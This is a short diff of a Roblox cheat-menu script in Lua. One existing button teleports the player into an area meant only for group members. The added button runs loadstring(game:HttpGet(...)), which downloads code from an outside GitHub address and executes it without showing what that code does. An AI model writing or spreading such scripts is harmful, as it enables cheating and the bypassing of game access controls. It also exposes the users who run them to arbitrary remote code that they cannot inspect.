@@ -158,6 +158,10 @@ end)
 
 Section:NewButton("tp to secret(u need to be in group to get in)", "tp", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-127,4,121)-- secret
+end)
+
+Section:NewButton("walkspeed GUI", "simple script by 'xyn 0001", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/offperms/walkspeed/main/script"))()
     end)
 -- client
 
